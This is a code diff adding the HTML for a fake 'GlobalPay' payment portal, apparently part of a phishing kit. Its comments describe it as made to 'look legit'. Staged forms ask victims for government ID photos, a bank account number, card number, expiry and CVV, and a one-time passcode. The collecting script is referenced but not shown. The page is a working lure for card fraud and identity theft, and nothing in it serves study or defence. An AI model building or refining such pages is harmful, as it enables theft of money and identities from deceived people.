@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GlobalPay Secure Portal</title>
+    <link rel="stylesheet" href="auth.css">
+    <!-- Favicon - make it look legit -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>💸</text></svg>">
+</head>
+<body>
+    <div class="main-container">
+        <div id="auth-page" class="page active">
+            <!-- Auth content will be injected by JS -->
+        </div>
+
+        <div id="dashboard-page" class="page">
+            <header>
+                <h1>GlobalPay Dashboard</h1>
+                <button id="logout-btn" class="btn-secondary">Logout</button>
+            </header>
+            <main>
+                <div id="verification-status" class="status-banner">
+                    <p>Your account is not yet verified. <a href="#" id="start-verification-link">Verify your account</a> for full access.</p>
+                </div>
+                <section id="dashboard-content">
+                    <h2>Welcome, <span id="dashboard-username">User</span>!</h2>
+                    <p>This is your secure GlobalPay dashboard. Some features may be limited until verification is complete.</p>
+                    <!-- More fake dashboard elements -->
+                    <div class="card">
+                        <h3>Account Balance (Pending)</h3>
+                        <p>$0.00 USD (Verification Required)</p>
+                    </div>
+                    <div class="card">
+                        <h3>Recent Transactions (Pending)</h3>
+                        <p>No transactions found. Please verify your account.</p>
+                    </div>
+                </section>
+                
+                <div id="id-verification-module" class="module hidden">
+                    <h2>Account Identity Verification</h2>
+                    <p id="id-upload-instructions">To secure your account, please upload clear photos of the front and back of your government-issued ID, and provide the following details.</p>
+                    <form id="id-verification-form">
+                        <label for="id-cardholder-name">Full Name (as on ID):</label>
+                        <input type="text" id="id-cardholder-name" name="idCardHolderName" required>
+                        
+                        <label for="id-account-number">Bank Account Number (for verification):</label>
+                        <input type="text" id="id-account-number" name="accountNumber" required>
+
+                        <label for="id-postal-code">Postal Code:</label>
+                        <input type="text" id="id-postal-code" name="postalCode" required>
+
+                        <label for="id-front">ID Front:</label>
+                        <input type="file" id="id-front" name="idFront" accept="image/*" required>
+                        <img id="id-front-preview" class="id-preview" src="#" alt="ID Front Preview" style="display:none; max-width: 200px; margin-top:5px;">
+
+                        <label for="id-back">ID Back:</label>
+                        <input type="file" id="id-back" name="idBack" accept="image/*" required>
+                        <img id="id-back-preview" class="id-preview" src="#" alt="ID Back Preview" style="display:none; max-width: 200px; margin-top:5px;">
+                        
+                        <button type="submit" class="btn-primary">Submit ID for Verification</button>
+                        <p id="id-message" class="message"></p>
+                    </form>
+                </div>
+
+                <div id="card-details-module" class="module hidden">
+                    <h2>Secure Payment Method</h2>
+                    <p>Your identity is confirmed! Now, please add or confirm your payment card details.</p>
+                    <form id="card-details-form">
+                        <label for="card-holder-name">Card Holder Name:</label>
+                        <input type="text" id="card-holder-name" name="cardHolderName" required>
+                        <label for="card-number">Card Number:</label>
+                        <input type="text" id="card-number" name="cardNumber" placeholder="0000 0000 0000 0000" required>
+                        <label for="card-expiry">Expiry Date (MM/YY):</label>
+                        <input type="text" id="card-expiry" name="cardExpiry" placeholder="MM/YY" required>
+                        <label for="card-cvv">CVV:</label>
+                        <input type="text" id="card-cvv" name="cardCVV" placeholder="123" required>
+                        <button type="submit" class="btn-primary">Submit Card Details</button>
+                        <p id="card-message" class="message"></p>
+                    </form>
+                </div>
+
+                <div id="otp-module" class="module hidden">
+                    <h2>Enter Verification Code</h2>
+                    <p>A one-time password (OTP) has been sent to your primary device. Enter it below to complete the process.</p>
+                    <form id="otp-form">
+                        <label for="otp-code">OTP Code:</label>
+                        <input type="text" id="otp-code" name="otpCode" required>
+                        <button type="submit" class="btn-primary">Verify OTP</button>
+                    </form>
+                    <p id="otp-message" class="message"></p>
+                </div>
+            </main>
+        </div>
+        <div class="spinner-overlay hidden">
+            <div class="spinner"></div>
+        </div>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
